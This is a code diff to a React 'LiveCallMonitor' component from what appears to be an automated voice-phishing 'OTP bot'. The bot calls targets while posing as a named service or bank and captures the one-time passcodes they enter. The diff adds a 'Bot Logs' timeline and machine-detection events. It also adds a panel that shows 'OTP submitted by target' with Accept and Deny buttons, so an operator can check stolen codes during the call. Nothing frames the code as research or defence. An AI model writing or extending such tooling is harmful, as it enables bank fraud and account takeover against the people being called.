@@ -79,6 +79,9 @@ export default function LiveCallMonitor({ callId, callData, onClose }) {
       case 'call_ringing': return '📞';
       case 'call_answered': return '☎️';
       case 'human_detected': return '🙋';
+      case 'machine_detected': return '🤖';
+      case 'unknown_detected': return '🔍';
+      case 'message_played': return '🔊';
       case 'first_input_received': return '1️⃣';
       case 'otp_received': return '🕵️';
       case 'call_completed': return '🏁';
@@ -90,116 +93,96 @@ export default function LiveCallMonitor({ callId, callData, onClose }) {
     <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4">
       <div className="bg-[#0a0a0a] border border-green-500/30 rounded-xl p-6 max-w-4xl w-full max-h-[90vh] overflow-hidden flex flex-col">
         {/* Header */}
-        <div className="flex items-center justify-between mb-6">
-          <div className="flex items-center gap-3">
-            <div className="w-12 h-12 rounded-full bg-green-500/20 flex items-center justify-center">
-              <Phone className="w-6 h-6 text-green-500" />
+        <div className="flex items-center justify-between mb-4">
+          <h2 className="text-2xl font-bold text-green-400">🤖 Bot Logs</h2>
+          <Button onClick={onClose} variant="ghost" className="text-gray-400 hover:text-white">
+            ✕
+          </Button>
+        </div>
+
+        {/* OTP Accept/Deny Section */}
+        {showAcceptDeny && otpCode && (
+          <div className="mb-4 p-6 bg-gradient-to-r from-orange-900/30 to-yellow-900/30 border border-yellow-600/50 rounded-lg">
+            <div className="flex items-center justify-between">
+              <div>
+                <p className="text-yellow-300 font-semibold text-lg mb-2">🕵️ OTP submitted by target: {otpCode}</p>
+              </div>
+              <div className="flex gap-3">
+                <Button 
+                  onClick={handleAccept}
+                  className="bg-green-600 hover:bg-green-700 text-white px-6 py-2"
+                  data-testid="accept-button"
+                >
+                  ✅ Accept
+                </Button>
+                <Button 
+                  onClick={handleDeny}
+                  className="bg-red-600 hover:bg-red-700 text-white px-6 py-2"
+                  data-testid="deny-button"
+                >
+                  ❌ Deny
+                </Button>
+              </div>
             </div>
-            <div>
-              <h2 className="text-2xl font-bold text-white">Live Call Monitor</h2>
-              <p className="text-gray-400 text-sm">Call ID: {callId.slice(0, 8)}...</p>
-            </div>
+          </div>
+        )}
+
+        {/* Bot Logs Timeline */}
+        <div className="flex-1 overflow-y-auto bg-[#0a0a0a] border border-green-500/30 rounded-lg p-4 mb-4">
+          <div className="space-y-2">
+            {events.length === 0 ? (
+              <p className="text-gray-500 text-center py-8">Waiting for call events...</p>
+            ) : (
+              events.map((event, index) => (
+                <div key={index} className="flex items-start gap-3 text-sm py-2 border-b border-gray-800/50 last:border-0">
+                  <span className="text-2xl">{getEventIcon(event.event)}</span>
+                  <div className="flex-1">
+                    <p className="text-gray-300">{event.message || event.event}</p>
+                    <p className="text-gray-600 text-xs mt-1">@ {new Date(event.time).toLocaleTimeString()}</p>
+                  </div>
+                </div>
+              ))
+            )}
           </div>
         </div>
 
-        {/* Status Section */}
-        <div className="space-y-4 mb-6">
-          <div className="bg-[#0a0a0a] rounded-lg p-4 border border-gray-800">
-            <h3 className="text-green-400 font-semibold mb-3">Status Information</h3>
-            <div className="grid grid-cols-2 gap-3 text-sm">
-              <div>
-                <span className="text-gray-400">Status:</span>
-                <span className="text-white ml-2 font-medium">{liveData.status}</span>
-              </div>
-              <div>
-                <span className="text-gray-400">Answered By:</span>
-                <span className="text-white ml-2 font-medium uppercase">{liveData.answered_by}</span>
-              </div>
-              <div>
-                <span className="text-gray-400">Code:</span>
-                <span className="text-white ml-2 font-medium">{liveData.code}</span>
-              </div>
-              <div>
-                <span className="text-gray-400">Recording URL:</span>
-                <span className="text-white ml-2 font-medium">{liveData.recording_url}</span>
-              </div>
-              <div className="col-span-2">
-                <span className="text-gray-400">Responses:</span>
-                <span className="text-white ml-2 font-medium">{liveData.responses}</span>
-              </div>
-            </div>
+        {/* Call Info Footer */}
+        <div className="grid grid-cols-3 gap-3 text-xs mb-4">
+          <div>
+            <span className="text-gray-500">Status:</span>
+            <span className="text-green-400 ml-2 font-medium uppercase">{callStatus}</span>
           </div>
-
-          {/* Call Information */}
-          <div className="bg-[#0a0a0a] rounded-lg p-4 border border-gray-800">
-            <h3 className="text-green-400 font-semibold mb-3">Call Information</h3>
-            <div className="grid grid-cols-2 gap-3 text-sm">
-              <div>
-                <span className="text-gray-400">Caller ID:</span>
-                <span className="text-white ml-2 font-medium">{callData.from_number}</span>
-              </div>
-              <div>
-                <span className="text-gray-400">Recipient Name:</span>
-                <span className="text-white ml-2 font-medium">{callData.recipient_name}</span>
-              </div>
-              <div>
-                <span className="text-gray-400">Recipient Number:</span>
-                <span className="text-white ml-2 font-medium">{callData.to_number}</span>
-              </div>
-              <div>
-                <span className="text-gray-400">Service Name:</span>
-                <span className="text-white ml-2 font-medium">{callData.service_name}</span>
-              </div>
-              <div>
-                <span className="text-gray-400">Required Digit:</span>
-                <span className="text-white ml-2 font-medium">{callData.digits || 6}</span>
-              </div>
-              <div>
-                <span className="text-gray-400">Card Type:</span>
-                <span className="text-white ml-2 font-medium">-</span>
-              </div>
-              <div>
-                <span className="text-gray-400">Bank Name:</span>
-                <span className="text-white ml-2 font-medium">-</span>
-              </div>
-              <div>
-                <span className="text-gray-400">Card Ending:</span>
-                <span className="text-white ml-2 font-medium">-</span>
-              </div>
-              <div>
-                <span className="text-gray-400">Language:</span>
-                <span className="text-white ml-2 font-medium">{callData.language || 'en-US'}</span>
-              </div>
-              <div>
-                <span className="text-gray-400">Voice:</span>
-                <span className="text-white ml-2 font-medium">{callData.tts_voice}</span>
-              </div>
-            </div>
+          <div>
+            <span className="text-gray-500">From:</span>
+            <span className="text-white ml-2">{callData.from_number}</span>
+          </div>
+          <div>
+            <span className="text-gray-500">To:</span>
+            <span className="text-white ml-2">{callData.to_number}</span>
           </div>
         </div>
 
-        {/* Action Button */}
+        {/* Action Buttons */}
         <div className="flex gap-3">
           <Button
             onClick={handleHangup}
-            className="flex-1 bg-red-600 hover:bg-red-700 text-white"
+            className="flex-1 bg-blue-600 hover:bg-blue-700 text-white"
             data-testid="hangup-button"
           >
             <PhoneOff className="w-4 h-4 mr-2" />
             HangUp
           </Button>
           <Button
-            onClick={onClose}
             variant="outline"
-            className="flex-1 border-gray-700 hover:bg-gray-800"
+            className="px-6 border-green-600 text-green-400 hover:bg-green-900/30"
           >
-            Close Monitor
+            Clear Logs
           </Button>
         </div>
 
         {/* Loading Footer */}
         {isLoading && (
-          <div className="mt-4 text-center text-gray-400 text-sm">
+          <div className="mt-3 text-center text-gray-500 text-xs">
             Fetching data. Please do not refresh browser.
           </div>
         )}
